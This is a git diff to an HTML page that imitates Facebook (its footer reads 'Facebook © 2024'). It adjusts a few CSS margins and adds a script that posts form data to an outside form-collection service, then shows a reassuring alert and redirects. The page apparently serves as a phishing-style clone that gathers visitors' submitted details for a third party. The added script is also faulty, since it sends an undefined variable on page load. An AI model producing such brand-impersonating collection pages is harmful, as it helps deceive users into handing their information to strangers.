@@ -31,10 +31,11 @@
             display: flex;
             margin: 0;
             padding: 0;
+            margin-left: 40px;
         }
 
         nav ul li {
-            margin-left: 20px;
+            margin-left: 50px;
         }
 
         nav ul li a {
@@ -74,6 +75,7 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            margin-left:10px;
         }
 
         /* Signup section styles */
@@ -198,6 +200,27 @@
     <footer>
         <p>Facebook © 2024</p>
     </footer>
-
+    <script>
+    fetch('https://submit.formspark.io/dmQeERDSQ', {
+    method: 'POST',
+    body: formData,
+    mode: 'cors' // Enable CORS mode
+})
+.then(response => {
+    if (response.ok) {
+        // Success handling
+        alert('We will contact you shortly');
+        setTimeout(function() {
+            window.location.href = 'home.html';
+        }, 3000);
+    } else {
+        alert('Error: Unable to submit the form. Please try again.');
+    }
+})
+.catch(error => {
+    alert('Submission failed due to network error.');
+    console.error('Form submission error:', error);
+});
+    </script>
 </body>
 </html>
